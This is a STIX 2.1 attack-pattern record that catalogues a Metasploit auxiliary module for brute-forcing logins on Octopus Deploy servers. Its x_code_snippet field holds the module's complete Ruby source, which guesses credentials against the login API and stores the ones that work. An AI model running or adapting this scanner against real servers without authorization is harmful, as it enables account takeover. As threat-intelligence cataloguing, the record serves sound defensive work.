{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e831693b-d4bb-49c4-93c6-4483792425c4",
    "created": "2024-08-14T16:29:04.56153Z",
    "modified": "2024-08-14T16:29:04.561533Z",
    "name": "Octopus Deploy Login Utility",
    "description": " This module simply attempts to login to an Octopus Deploy server using a specific username and password. It has been confirmed to work on version 3.4.4 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/octopusdeploy_login.rb",
            "external_id": "octopusdeploy_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/octopusdeploy'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Octopus Deploy Login Utility',\n      'Description'    => %q{\n        This module simply attempts to login to an Octopus Deploy server using a specific\n        username and password. It has been confirmed to work on version 3.4.4\n      },\n      'Author'         => [ 'James Otten <jamesotten1[at]gmail.com>' ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'URI for login. Default is /api/users/login', '/api/users/login'])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::OctopusDeploy.new(\n      configure_http_login_scanner(\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 10,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword'],\n        uri: datastore['TARGETURI']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\nend\n"
}